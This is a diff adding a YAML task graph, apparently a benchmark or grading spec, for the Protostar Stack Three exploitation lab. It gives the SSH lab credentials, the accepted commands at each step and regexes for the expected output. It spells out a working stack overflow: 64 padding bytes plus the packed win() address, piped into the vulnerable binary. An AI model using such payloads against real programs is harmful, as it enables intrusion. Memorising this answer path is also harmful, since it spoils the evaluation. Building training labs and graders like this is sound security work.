@@ -1,0 +1,95 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_stack3
+  name: Protostar Stack Three
+  description: Overwrite the stack function pointer with the address of win() and redirect code flow.
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Offset to function pointer identified
+- id: node1
+  type: state
+  label: win() address recovered
+- id: node2
+  type: state
+  label: Exploit payload built
+- id: node3
+  type: state
+  label: Function pointer redirected to win()
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: find_offset_to_function_pointer
+  accepted_commands:
+  - python -c 'print "A"*64 + "BBBB"' | /opt/protostar/bin/stack3
+  - gdb -q /opt/protostar/bin/stack3
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*(jumping to 0x42424242|Segmentation fault).*
+    stderr_regex: .*
+- id: edge1
+  from: node0
+  to: node1
+  action: recover_win_symbol_address
+  accepted_commands:
+  - objdump -t /opt/protostar/bin/stack3 | grep " win"
+  - nm /opt/protostar/bin/stack3 | grep " win"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .* win.*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: build_function_pointer_payload
+  accepted_commands:
+  - python -c 'import struct; print "A"*64 + struct.pack("<I", 0x08048424)'
+  - perl -e 'print "A"x64 . pack("V", 0x08048424)'
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: trigger_win_via_function_pointer
+  accepted_commands:
+  - python -c 'import struct; print "A"*64 + struct.pack("<I", 0x08048424)' | /opt/protostar/bin/stack3
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*code flow successfully changed.*
+    stderr_regex: ^$
